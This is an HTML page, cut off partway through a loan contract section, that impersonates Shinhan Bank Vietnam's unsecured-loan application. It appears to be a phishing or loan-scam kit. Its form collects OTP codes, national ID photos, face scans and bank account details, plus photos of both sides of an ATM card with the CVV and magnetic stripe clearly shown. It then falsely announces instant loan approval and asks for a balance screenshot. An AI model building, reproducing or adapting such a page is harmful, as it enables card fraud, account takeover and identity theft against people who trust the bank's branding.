<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Vay tiêu dùng tín chấp | Shinhan Bank</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tooltipster/4.2.8/css/tooltipster.bundle.min.css">
    <style>
        body {
            background: linear-gradient(135deg, #005BAC 0%, #004080 100%);
            color: #fff;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 100%;
            padding: 20px;
        }
        .modal-dialog {
            max-width: 90vw;
            margin: 1.5rem auto;
        }
        .modal-content {
            border-radius: 16px;
            padding: 16px;
            background: #f8f9fa;
            color: #333;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
            border: none;
        }
        .modal-body {
            padding: 24px;
            display: grid;
            gap: 16px;
        }
        .modal-header {
            border-bottom: none;
            display: flex;
            align-items: center;
        }
        .modal-title {
            font-size: 18px;
            color: #005BAC;
            flex-grow: 1;
            text-align: center;
        }
        .vib-v2-input01 {
            position: relative;
            margin-bottom: 12px;
        }
        .vib-v2-input01 input, .vib-v2-input01 select {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        .vib-v2-input01 input:focus, .vib-v2-input01 select:focus {
            border-color: #005BAC;
            box-shadow: 0 0 8px rgba(0, 91, 172, 0.2);
            outline: none;
        }
        .vib-v2-input01 .ph_input {
            font-size: 14px;
            color: #666;
            margin-bottom: 8px;
            display: block;
            font-weight: 500;
        }
        .error-message {
            color: #e63946;
            font-size: 12px;
            margin-top: 4px;
            display: none;
        }
        .photo-card {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 8px;
            background: #f9f9f9;
            padding: 8px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .photo-preview {
            max-width: 80px;
            border-radius: 8px;
            border: 1px solid #e0e0e0;
        }
        .delete-photo {
            background: #e63946;
            color: #fff;
            border: none;
            padding: 6px 12px;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .delete-photo:hover {
            background: #d00000;
        }
        .step-buttons {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 12px;
            flex-wrap: wrap;
        }
        .btn-step, .vib-v2-btn-dk02 {
            width: 100%;
            max-width: 200px;
            padding: 10px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            border: none;
            cursor: pointer;
            transition: transform 0.2s, background 0.3s, box-shadow 0.3s;
        }
        .btn-step.prev {
            background: #e0e0e0;
            color: #333;
        }
        .btn-step.next, .vib-v2-btn-dk02 {
            background: linear-gradient(135deg, #F37021, #d94f00);
            color: #fff;
            box-shadow: 0 4px 8px rgba(243, 112, 33, 0.3);
        }
        .btn-step:disabled {
            background: #ccc;
            cursor: not-allowed;
            box-shadow: none;
        }
        .btn-step:hover:not(:disabled), .vib-v2-btn-dk02:hover {
            background: #004080;
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 64, 128, 0.3);
        }
        .step {
            display: none;
            opacity: 0;
            transform: translateY(20px);
            transition: opacity 0.2s ease-in-out, transform 0.2s ease-in-out;
        }
        .step.active {
            display: block;
            opacity: 1;
            transform: translateY(0);
        }
        .progress-bar {
            display: flex;
            flex-direction: row;
            gap: 8px;
            margin-bottom: 12px;
            overflow-x: auto;
            padding-bottom: 8px;
        }
        .progress-step {
            flex: 1;
            text-align: center;
            padding: 8px;
            background: #005BAC;
            border-radius: 8px;
            font-size: 12px;
            color: #fff;
            transition: background 0.3s, color 0.3s;
            min-width: 60px;
        }
        .progress-step.active {
            background: #F37021;
            color: #fff;
        }
        .progress-step[data-step="3"],
        .progress-step[data-step="4"],
        .progress-step[data-step="5"] {
            background: #F37021;
            color: #fff;
        }
        .progress-step[data-step="3"].active,
        .progress-step[data-step="4"].active,
        .progress-step[data-step="5"].active {
            background: #d94f00;
        }
        .face-scan-container {
            text-align: center;
            background: #f9f9f9;
            padding: 12px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .face-scan-circle {
            border: 3px dashed #005BAC;
            border-radius: 50%;
            width: 150px;
            height: 150px;
            margin: 8px auto;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: #666;
            position: relative;
            overflow: hidden;
        }
        .face-scan-guide {
            font-size: 14px;
            color: #005BAC;
            margin: 8px 0;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #005BAC;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 12px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #e63946;
            color: #fff;
            padding: 12px 24px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            display: none;
            z-index: 1000;
            font-size: 14px;
        }
        .initial-button {
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            border: none;
            background: linear-gradient(135deg, #005BAC, #004080);
            color: #fff;
            cursor: pointer;
            transition: transform 0.2s, background 0.3s, box-shadow 0.3s;
        }
        .initial-button:hover {
            background: #F37021;
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(243, 112, 33, 0.3);
        }
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s, visibility 0.3s;
        }
        .loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }
        .loading-spinner {
            border: 4px solid #fff;
            border-top: 4px solid #005BAC;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }
        #signatureCanvas {
            background: #f9f9f9;
            cursor: crosshair;
        }
        #signaturePreview {
            border: 1px solid #ccc;
            border-radius: 8px;
        }
        .loan-chart-container {
            margin: 12px 0;
            padding: 12px;
            background: #f4f4f4;
            border-radius: 8px;
            text-align: center;
        }
        .contract-table {
            width: 100%;
            border-collapse: collapse;
            margin: 12px 0;
        }
        .contract-table th, .contract-table td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        .contract-table th {
            background: #f4f4f4;
            font-weight: 500;
        }
        .contract-table td {
            background: #fff;
        }
        .logo-shinhan {
            max-width: 120px;
            margin: 0 auto 12px;
            display: block;
        }
        .intro-section {
            text-align: center;
            margin-bottom: 20px;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            color: #333;
        }
        @media (max-width: 767px) {
            .modal-dialog {
                max-width: 95vw;
                margin: 0.5rem auto;
            }
            .modal-content {
                padding: 12px;
            }
            .modal-body {
                padding: 12px;
                gap: 8px;
            }
            .modal-title {
                font-size: 16px;
            }
            .vib-v2-input01 input, .vib-v2-input01 select {
                font-size: 12px;
                padding: 8px;
                border-radius: 6px;
            }
            .vib-v2-input01 .ph_input {
                font-size: 12px;
                margin-bottom: 6px;
            }
            .error-message {
                font-size: 10px;
            }
            .step-buttons {
                flex-direction: column;
                gap: 8px;
            }
            .btn-step, .vib-v2-btn-dk02 {
                font-size: 12px;
                padding: 8px;
                max-width: 100%;
            }
            .photo-preview {
                max-width: 60px;
            }
            .photo-card {
                padding: 6px;
                gap: 6px;
            }
            .face-scan-circle {
                width: 100px;
                height: 100px;
            }
            .face-scan-guide {
                font-size: 12px;
            }
            .progress-step {
                font-size: 10px;
                padding: 6px;
                min-width: 50px;
            }
            .initial-button {
                font-size: 14px;
                padding: 10px 20px;
            }
            .photo-guide img {
                max-width: 80px;
            }
            .loan-chart-container {
                padding: 8px;
            }
            #signatureCanvas {
                width: 120px;
                height: 60px;
            }
            #signaturePreview {
                max-width: 120px;
            }
            .contract-table th, .contract-table td {
                padding: 6px;
                font-size: 12px;
            }
        }
        @media (orientation: landscape) and (max-width: 1024px) {
            .modal-dialog {
                max-width: 80vw;
            }
            .face-scan-circle {
                width: 120px;
                height: 120px;
            }
            .photo-preview {
                max-width: 70px;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
    </div>

    <!-- Giao diện ban đầu -->
    <div class="container">
        <div class="intro-section">
            <img src="https://www.shinhan.com.vn/vi/images/logo.png" class="logo-shinhan" alt="Shinhan Bank Logo">
            <h2>Giới thiệu Shinhan Bank</h2>
            <p>Shinhan Bank Việt Nam cung cấp các giải pháp tài chính đa dạng, từ vay tiêu dùng, vay mua nhà, vay mua xe đến các dịch vụ ngân hàng số hiện đại. Với cam kết mang lại trải nghiệm tốt nhất, chúng tôi hỗ trợ khách hàng đạt được mục tiêu tài chính một cách nhanh chóng và an toàn.</p>
        </div>
        <button id="showFormButton" class="initial-button">Đăng ký vay ngay</button>
    </div>

    <!-- Register Modal -->
    <div id="registerForm" class="modal fade">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <img src="https://www.shinhan.com.vn/vi/images/logo.png" class="logo-shinhan" alt="Shinhan Bank Logo">
                    <h5 class="modal-title">Đăng ký vay tín chấp</h5>
                    <button type="button" class="close" data-dismiss="modal">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="progress-bar" role="navigation" aria-label="Tiến trình đăng ký vay">
                        <div class="progress-step active" data-step="1" role="button" tabindex="0" aria-current="step">Thông tin cá nhân</div>
                        <div class="progress-step" data-step="2" role="button" tabindex="0">Chứng minh</div>
                        <div class="progress-step" data-step="3" role="button" tabindex="0">Chụp CCCD/ATM</div>
                        <div class="progress-step" data-step="4" role="button" tabindex="0">Xác minh khuôn mặt</div>
                        <div class="progress-step" data-step="5" role="button" tabindex="0">Thông tin vay</div>
                    </div>
                    <form id="contact-form" enctype="multipart/form-data">
                        <!-- Step 1 -->
                        <div class="step active" id="step-1">
                            <p style="font-size: 14px; color: #666; margin-bottom: 12px;"><strong>Hướng dẫn:</strong> Điền đầy đủ thông tin cá nhân.</p>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Họ và tên (*)</span>
                                <input type="text" name="fullName" required class="field_input tooltip" title="Họ tên từ 2-50 ký tự, không chứa số/ký tự đặc biệt." autofocus />
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Số điện thoại (*)</span>
                                <input type="tel" name="phone" required class="field_input tooltip" pattern="^0[0-9]{9}$" title="Số điện thoại 10 số, bắt đầu bằng 0." />
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01" id="otpContainer" style="display: none;">
                                <span class="ph_input">Mã OTP (*)</span>
                                <input type="text" name="otp" class="field_input tooltip" title="Nhập mã OTP 6 số." />
                                <button type="button" class="vib-v2-btn-dk02" onclick="sendOTP()">Gửi OTP</button>
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Email</span>
                                <input type="email" name="email" class="field_input tooltip" title="Nhập email hợp lệ (VD: example@domain.com)." />
                                <div class="error-message"></div>
                            </div>
                            <div class="step-buttons">
                                <button type="button" class="btn-step next" onclick="nextStep(2)">Tiếp theo</button>
                            </div>
                        </div>
                        <!-- Step 2 -->
                        <div class="step" id="step-2">
                            <p style="font-size: 14px; color: #666; margin-bottom: 12px;"><strong>Hướng dẫn:</strong> Cung cấp thông tin giấy tờ tùy thân.</p>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Số CCCD/CMND (*)</span>
                                <input type="text" name="idNumber" required class="field_input tooltip" pattern="^\d{9}$|^\d{12}$" title="CMND/CCCD phải là 9 hoặc 12 số." autofocus />
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Ngày cấp (*)</span>
                                <input type="date" name="idIssueDate" required class="field_input tooltip" title="Chọn ngày cấp, không được trong tương lai." />
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Nơi cấp (*)</span>
                                <input type="text" name="idIssuePlace" required class="field_input tooltip" title="Nhập nơi cấp (VD: Hà Nội)." />
                                <div class="error-message"></div>
                            </div>
                            <div class="step-buttons">
                                <button type="button" class="btn-step prev" onclick="prevStep(1)">Quay lại</button>
                                <button type="button" class="btn-step next" onclick="nextStep(3)">Tiếp theo</button>
                            </div>
                        </div>
                        <!-- Step 3 -->
                        <div class="step" id="step-3">
                            <p style="font-size: 14px; color: #666; margin-bottom: 12px;"><strong>Hướng dẫn:</strong> Tải ảnh CCCD/CMND và thẻ ATM rõ nét, không mất góc.</p>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Ảnh CCCD/CMND (Mặt trước) (*)</span>
                                <input type="file" name="idPhotoFront" accept="image/jpeg,image/png" required class="field_input tooltip" title="Chụp rõ số CCCD, không mất góc/mờ." onchange="previewImage(this, 'idPhotoFrontPreview', 'idPhotoFrontUploaded')" />
                                <div class="photo-card">
                                    <img id="idPhotoFrontPreview" class="photo-preview" style="display: none;" />
                                    <button class="delete-photo" onclick="deletePhoto('idPhotoFront')" style="display: none;">Xóa</button>
                                </div>
                                <div id="idPhotoFrontUploaded" class="photo-uploaded" style="display: none;"><i class="fas fa-check"></i> Đã tải lên</div>
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Ảnh CCCD/CMND (Mặt sau) (*)</span>
                                <input type="file" name="idPhotoBack" accept="image/jpeg,image/png" required class="field_input tooltip" title="Chụp rõ mặt sau, không mất góc/mờ." onchange="previewImage(this, 'idPhotoBackPreview', 'idPhotoBackUploaded')" />
                                <div class="photo-card">
                                    <img id="idPhotoBackPreview" class="photo-preview" style="display: none;" />
                                    <button class="delete-photo" onclick="deletePhoto('idPhotoBack')" style="display: none;">Xóa</button>
                                </div>
                                <div id="idPhotoBackUploaded" class="photo-uploaded" style="display: none;"><i class="fas fa-check"></i> Đã tải lên</div>
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Ảnh thẻ ATM (Mặt trước) (*)</span>
                                <input type="file" name="atmPhotoFront" accept="image/jpeg,image/png" required class="field_input tooltip" title="Chụp rõ số thẻ, tên, logo ngân hàng." onchange="previewImage(this, 'atmPhotoFrontPreview', 'atmPhotoFrontUploaded')" />
                                <div class="photo-card">
                                    <img id="atmPhotoFrontPreview" class="photo-preview" style="display: none;" />
                                    <button class="delete-photo" onclick="deletePhoto('atmPhotoFront')" style="display: none;">Xóa</button>
                                </div>
                                <div id="atmPhotoFrontUploaded" class="photo-uploaded" style="display: none;"><i class="fas fa-check"></i> Đã tải lên</div>
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Ảnh thẻ ATM (Mặt sau) (*)</span>
                                <input type="file" name="atmPhotoBack" accept="image/jpeg,image/png" required class="field_input tooltip" title="Chụp rõ mã CVV, dải từ." onchange="previewImage(this, 'atmPhotoBackPreview', 'atmPhotoBackUploaded')" />
                                <div class="photo-card">
                                    <img id="atmPhotoBackPreview" class="photo-preview" style="display: none;" />
                                    <button class="delete-photo" onclick="deletePhoto('atmPhotoBack')" style="display: none;">Xóa</button>
                                </div>
                                <div id="atmPhotoBackUploaded" class="photo-uploaded" style="display: none;"><i class="fas fa-check"></i> Đã tải lên</div>
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Ảnh khuôn mặt/chân dung (*)</span>
                                <input type="file" name="facePhoto" accept="image/jpeg,image/png" required class="field_input tooltip" title="Chụp rõ khuôn mặt, ánh sáng tốt, không đeo kính/mũ." onchange="previewImage(this, 'facePhotoPreview', 'facePhotoUploaded')" />
                                <div class="photo-card">
                                    <img id="facePhotoPreview" class="photo-preview" style="display: none;" />
                                    <button class="delete-photo" onclick="deletePhoto('facePhoto')" style="display: none;">Xóa</button>
                                </div>
                                <div id="facePhotoUploaded" class="photo-uploaded" style="display: none;"><i class="fas fa-check"></i> Đã tải lên</div>
                                <div class="error-message"></div>
                            </div>
                            <div class="photo-guide" style="text-align: center; margin-top: 12px; background: #f9f9f9; padding: 12px; border-radius: 8px;">
                                <p style="font-size: 14px;">CCCD/CMND: Chụp rõ số, họ tên, không mất góc/mờ. ATM: Chụp rõ số thẻ, tên, logo (mặt trước); mã CVV, dải từ (mặt sau). Khuôn mặt: Chụp rõ, ánh sáng tốt, không đeo kính/mũ.</p>
                                <p style="font-size: 14px;">Chụp thẻ ATM trên app ngân hàng (VD: Shinhan SOL, Techcombank Mobile, TPBank Mobile, ACB ONE, Timo): Truy cập mục 'Định danh eKYC' hoặc 'Upload tài liệu', cấp quyền camera, chụp mặt trước (số thẻ, tên, logo) và mặt sau (mã CVV, dải từ). Đặt thẻ trên bề mặt phẳng, ánh sáng tốt, không bóng/mờ. Nếu không có thẻ vật lý, mở thẻ online qua app và chụp ảnh thẻ ảo/số tài khoản.</p>
                                <img src="sample-id-card.jpg" alt="Mẫu CCCD" style="max-width: 120px; margin: 8px;" />
                                <img src="sample-atm-card-front.jpg" alt="Mẫu ATM mặt trước" style="max-width: 120px; margin: 8px;" />
                                <img src="sample-atm-card-back.jpg" alt="Mẫu ATM mặt sau" style="max-width: 120px; margin: 8px;" />
                                <a href="tutorial-video.mp4" class="vib-v2-btn-dk02" style="display: inline-block; margin: 8px;">Xem video hướng dẫn</a>
                                <button onclick="openCamera()" class="vib-v2-btn-dk02">Chụp ảnh</button>
                                <a href="https://m.me/ShinhanBankVietnam" target="_blank" class="vib-v2-btn-dk02" style="display: inline-block; margin: 8px;">Liên hệ hỗ trợ</a>
                            </div>
                            <div class="step-buttons">
                                <button type="button" class="btn-step prev" onclick="prevStep(2)">Quay lại</button>
                                <button type="button" class="btn-step next" onclick="nextStep(4)">Tiếp theo</button>
                            </div>
                        </div>
                        <!-- Step 4 -->
                        <div class="step" id="step-4">
                            <p style="font-size: 14px; color: #666; margin-bottom: 12px;"><strong>Hướng dẫn:</strong> Đưa khuôn mặt vào khung tròn, làm theo hướng dẫn để xác minh danh tính (eKYC). Đảm bảo ánh sáng tốt, không đeo kính/mũ.</p>
                            <div class="face-scan-container">
                                <video id="faceVideo" autoplay style="border-radius: 8px; max-width: 100%;" aria-label="Camera để xác minh khuôn mặt"></video>
                                <div class="face-scan-circle">Đưa khuôn mặt vào khung</div>
                                <p class="face-scan-guide" id="faceScanGuide">Vui lòng nhìn thẳng vào camera.</p>
                                <button onclick="verifyFace()" class="vib-v2-btn-dk02">Bắt đầu quét</button>
                                <button onclick="retryFaceScan()" class="vib-v2-btn-dk02" id="retryFaceScan" style="display: none;">Thử lại</button>
                                <div class="error-message"></div>
                            </div>
                            <div class="step-buttons">
                                <button type="button" class="btn-step prev" onclick="prevStep(3)">Quay lại</button>
                                <button type="button" class="btn-step next" id="faceScanNext" disabled onclick="nextStep(5)">Tiếp theo</button>
                            </div>
                        </div>
                        <!-- Step 5 -->
                        <div class="step" id="step-5">
                            <p style="font-size: 14px; color: #666; margin-bottom: 12px;"><strong>Hướng dẫn:</strong> Cung cấp thông tin khoản vay.</p>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Số tiền vay (VNĐ) (*)</span>
                                <input type="text" name="loanAmount" required class="field_input tooltip" title="Số tiền vay từ 10 triệu đến 900 triệu (tiêu dùng) hoặc 80% giá trị tài sản (xe/nhà)." oninput="formatCurrency(this)" autofocus />
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01" id="assetValueContainer" style="display: none;">
                                <span class="ph_input">Giá trị tài sản (VNĐ) (*)</span>
                                <input type="text" name="assetValue" class="field_input tooltip" title="Nhập giá trị tài sản (VD: giá xe, nhà)." oninput="formatCurrency(this)" />
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Thời hạn vay (tháng) (*)</span>
                                <select name="loanTerm" required class="field_input tooltip" title="Chọn thời hạn vay từ 12 đến 300 tháng.">
                                    <option value="">Chọn thời hạn</option>
                                    <option value="12">12 tháng</option>
                                    <option value="24">24 tháng</option>
                                    <option value="36">36 tháng</option>
                                    <option value="48">48 tháng</option>
                                    <option value="60">60 tháng</option>
                                    <option value="72">72 tháng</option>
                                    <option value="84">84 tháng</option>
                                    <option value="96">96 tháng</option>
                                    <option value="108">108 tháng</option>
                                    <option value="120">120 tháng</option>
                                    <option value="180">180 tháng</option>
                                    <option value="240">240 tháng</option>
                                    <option value="300">300 tháng</option>
                                </select>
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Loại vay (*)</span>
                                <select name="loanType" required class="field_input tooltip" title="Chọn loại vay phù hợp với nhu cầu.">
                                    <option value="">Chọn loại vay</option>
                                    <option value="Vay tiêu dùng">Vay tiêu dùng</option>
                                    <option value="Vay mua nhà">Vay mua nhà</option>
                                    <option value="Vay mua xe">Vay mua xe</option>
                                    <option value="Vay tiêu dùng số">Vay tiêu dùng số</option>
                                </select>
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Mục đích vay</span>
                                <input type="text" name="loanPurpose" class="field_input tooltip" title="Mô tả mục đích sử dụng khoản vay (tùy chọn)." />
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Số điện thoại người thân hoặc bạn bè (*)</span>
                                <input type="tel" name="relativePhone" required class="field_input tooltip" pattern="^0[0-9]{9}$" title="Số điện thoại 10 số, bắt đầu bằng 0." />
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Số tài khoản (*)</span>
                                <input type="text" name="accountNumber" required class="field_input tooltip" pattern="^[0-9]{9,15}$" title="Số tài khoản từ 9-15 số." />
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Ngân hàng (*)</span>
                                <select name="bank" required class="field_input tooltip" title="Chọn ngân hàng của tài khoản.">
                                    <option value="">Chọn ngân hàng</option>
                                    <option value="Agribank">Ngân hàng Nông nghiệp và Phát triển Nông thôn (Agribank)</option>
                                    <option value="Vietcombank">Ngân hàng Ngoại thương Việt Nam (Vietcombank)</option>
                                    <option value="VietinBank">Ngân hàng Công Thương Việt Nam (VietinBank)</option>
                                    <option value="BIDV">Ngân hàng Đầu tư và Phát triển Việt Nam (BIDV)</option>
                                    <option value="Techcombank">Ngân hàng Kỹ Thương Việt Nam (Techcombank)</option>
                                    <option value="MBBank">Ngân hàng Quân đội (MBBank)</option>
                                    <option value="VPBank">Ngân hàng Việt Nam Thịnh Vượng (VPBank)</option>
                                    <option value="Sacombank">Ngân hàng Sài Gòn Thương Tín (Sacombank)</option>
                                    <option value="ACB">Ngân hàng Á Châu (ACB)</option>
                                    <option value="TPBank">Ngân hàng Tiên Phong (TPBank)</option>
                                    <option value="Shinhan">Ngân hàng Shinhan Việt Nam</option>
                                    <option value="HSBC">Ngân hàng HSBC Việt Nam</option>
                                    <option value="StandardChartered">Ngân hàng Standard Chartered Việt Nam</option>
                                    <option value="SCB">Ngân hàng Sài Gòn (SCB)</option>
                                    <option value="HDBank">Ngân hàng Phát triển TP.HCM (HDBank)</option>
                                    <option value="DongABank">Ngân hàng Đông Á (DongABank)</option>
                                    <option value="Eximbank">Ngân hàng Xuất Nhập khẩu Việt Nam (Eximbank)</option>
                                    <option value="LienVietPostBank">Ngân hàng Bưu điện Liên Việt (LienVietPostBank)</option>
                                    <option value="SeABank">Ngân hàng Đông Nam Á (SeABank)</option>
                                    <option value="NamABank">Ngân hàng Nam Á (NamABank)</option>
                                    <option value="OCB">Ngân hàng Phương Đông (OCB)</option>
                                    <option value="VIB">Ngân hàng Quốc tế (VIB)</option>
                                    <option value="MSB">Ngân hàng Hàng Hải (MSB)</option>
                                    <option value="PVcomBank">Ngân hàng Đại chúng (PVcomBank)</option>
                                    <option value="SHB">Ngân hàng Sài Gòn - Hà Nội (SHB)</option>
                                    <option value="ANZ">Ngân hàng ANZ Việt Nam</option>
                                    <option value="Citibank">Ngân hàng Citibank Việt Nam</option>
                                    <option value="UOB">Ngân hàng United Overseas Bank (UOB)</option>
                                    <option value="WooriBank">Ngân hàng Woori Việt Nam</option>
                                    <option value="PublicBank">Ngân hàng Public Bank Việt Nam</option>
                                    <option value="KienLongBank">Ngân hàng Kiên Long (KienLongBank)</option>
                                    <option value="SaigonBank">Ngân hàng Sài Gòn Công Thương (SaigonBank)</option>
                                    <option value="BacABank">Ngân hàng Bắc Á (BacABank)</option>
                                    <option value="BaoVietBank">Ngân hàng Bảo Việt (BaoVietBank)</option>
                                    <option value="GPBank">Ngân hàng Dầu khí Toàn cầu (GPBank)</option>
                                    <option value="OceanBank">Ngân hàng Đại Dương (OceanBank)</option>
                                    <option value="VRB">Ngân hàng Việt Nga (VRB)</option>
                                    <option value="Timo">Ngân hàng số Timo</option>
                                    <option value="Cake">Ngân hàng số Cake by VPBank</option>
                                    <option value="TNEX">Ngân hàng số TNEX by MSB</option>
                                </select>
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Tên chủ tài khoản (*)</span>
                                <input type="text" name="accountHolder" required class="field_input tooltip" title="Tên chủ tài khoản phải khớp với họ tên." />
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Thu nhập hàng tháng (VNĐ)</span>
                                <input type="text" name="monthlyIncome" class="field_input tooltip" title="Thu nhập từ 4 triệu trở lên (tùy chọn)." oninput="formatCurrency(this)" />
                                <div class="error-message"></div>
                            </div>
                            <div class="vib-v2-input01">
                                <span class="ph_input">Chi nhánh quản lý (*)</span>
                                <select name="branchName" required class="field_input tooltip" title="Chọn chi nhánh quản lý hồ sơ.">
                                    <option value="">Chọn chi nhánh</option>
                                    <option value="Chi nhánh Hà Nội">Chi nhánh Hà Nội</option>
                                    <option value="Chi nhánh TP.HCM">Chi nhánh TP.HCM</option>
                                    <option value="Chi nhánh Đà Nẵng">Chi nhánh Đà Nẵng</option>
                                    <option value="Chi nhánh Cần Thơ">Chi nhánh Cần Thơ</option>
                                </select>
                                <div class="error-message"></div>
                            </div>
                            <div class="loan-calculator" style="background: #f4f4f4; padding: 12px; border-radius: 8px; text-align: center;">
                                <input type="text" id="loanAmount" placeholder="Số tiền vay" style="margin-bottom: 8px; border-radius: 8px;" oninput="formatCurrency(this)">
                                <select id="loanTerm" style="margin-bottom: 8px; border-radius: 8px;">
                                    <option value="12">12 tháng</option>
                                    <option value="24">24 tháng</option>
                                    <option value="36">36 tháng</option>
                                    <option value="48">48 tháng</option>
                                    <option value="60">60 tháng</option>
                                    <option value="180">180 tháng</option>
                                    <option value="240">240 tháng</option>
                                    <option value="300">300 tháng</option>
                                </select>
                                <p>Lãi suất: <span id="interestRate">14%</span></p>
                                <p>Trả hàng tháng: <span id="monthlyPayment"></span></p>
                                <div class="loan-chart-container">
                                    <canvas id="loanChart" height="80"></canvas>
                                </div>
                            </div>
                            <div class="step-buttons">
                                <button type="button" class="btn-step prev" onclick="prevStep(4)">Quay lại</button>
                                <button type="button" class="btn-step next" onclick="submitForm()">Hoàn tất</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Success Modal -->
    <div class="modal fade" id="successModal">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Chúc mừng!</h5>
                    <button type="button" class="close" data-dismiss="modal">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <div class="modal-body" style="text-align: center;">
                    <div class="fireworks" style="background: url('assets/fireworks.gif'); height: 100px; margin-bottom: 12px;"></div>
                    <div class="success-check" style="font-size: 40px; color: #28a745;">✔</div>
                    <p style="font-size: 14px;">Hồ sơ của <strong><span id="successFullName"></span></strong> đã được duyệt!</p>
                    <p style="font-size: 14px;">Số tiền vay: <strong><span id="successLoanAmount"></span></strong></p>
                    <p style="font-size: 14px;">Số tài khoản: <strong><span id="successAccountNumber"></span></strong> (<span id="successBank"></span>)</p>
                    <p style="font-size: 14px;">Số tiền trả hàng tháng: <strong><span id="successMonthlyPayment"></span></strong></p>
                    <p style="font-size: 14px;">Lãi suất: <strong><span id="successInterestRate"></span></strong></p>
                    <p style="font-size: 14px;">Vui lòng ký hợp đồng và cung cấp ảnh số dư tài khoản để giải ngân.</p>
                    <button type="button" class="vib-v2-btn-dk02" onclick="$('#successModal').modal('hide'); $('#contractModal').modal('show');">Xem hồ sơ</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Contract Modal -->
    <div class="modal fade" id="contractModal">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Hồ sơ và hợp đồng vay</h5>
                    <button type="button" class="close" data-dismiss="modal">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="contract-section" style="margin-bottom: 24px;">
                        <h5 style="color: #005BAC; text-align: center;">Hợp đồng vay tín chấp</h5>
                        <div class="contract-container" id="contract-vay">
                            <img src="https://www.shinhan.com.vn/vi/images/logo.png" class="logo-shinhan" alt="Shinhan Bank Logo">
                            <h4 style="text-align: center; color: #333;">HỢP ĐỒNG VAY TÍN CHẤP</h4>
